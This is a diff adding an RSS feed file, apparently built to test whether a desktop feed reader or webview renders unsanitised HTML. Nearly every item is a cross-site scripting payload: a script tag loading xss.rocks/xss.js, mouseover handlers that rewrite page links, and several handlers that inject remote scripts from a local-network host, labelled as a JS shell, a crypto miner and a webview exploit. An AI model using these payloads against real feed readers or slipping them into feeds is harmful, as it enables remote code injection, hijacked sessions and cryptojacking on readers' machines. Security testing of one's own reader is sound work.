@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>Desktop test</title>
+  <link>https://www.w3schools.com</link>
+  <description>Get fucking XSS</description>
+  <item>
+    <title><SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT></title>
+    <link>localhost</link>
+    <description>
+      <a onmouseover="console.log(document)" href="https://google.com">Harmless Link</a>
+      <a onmouseover="document.getElementById('app').style.backgroundColor = 'red'">Harmless Link 2</a>
+      <a onmouseover="document.getElementsByTagName('a').forEach((data) => data.href = 'https://dcarl.me')">Harmless Link 3</a>
+      <a onmouseover="http://">Harmless Link 4</a>
+    </description>
+  </item>
+  <item>
+    <title>RSS Tutorial</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools <a>test</a></description>
+  </item>
+  <item>
+    <title>XML Tutorial STANDARD 1</title>
+    <link>https://www.w3schools.com/ml</link>
+    <description>
+    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/xss.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+    </description>
+  </item>
+  <item>
+    <title>JSShell</title>
+    <link>https://www.w3schools.net</link>
+    <description>
+    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = '//192.168.0.141:4848';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+    </description>
+  </item>
+  <item>
+    <title>JSShell</title>
+    <link>https://www.w3chools.net</link>
+    <description>
+    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/xss3.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+    </description>
+  </item>
+    <item>
+    <title>Mining</title>
+    <link>https://www.mining.net</link>
+    <description>
+    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/miningxss.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+    </description>
+  </item>
+      <item>
+    <title>webview 2</title>
+    <link>https://www.github.com</link>
+    <description>
+    <a onmouseover="var s = document.createElement('script');s.type = 'module';s.src = 'http://192.168.0.141/wv.js';document.getElementsByClassName('article-wrap')[0].lastElementChild.lastElementChild.append(s)">Hej med jer</a>
+    </description>
+  </item>
+</channel>
+
+</rss> 
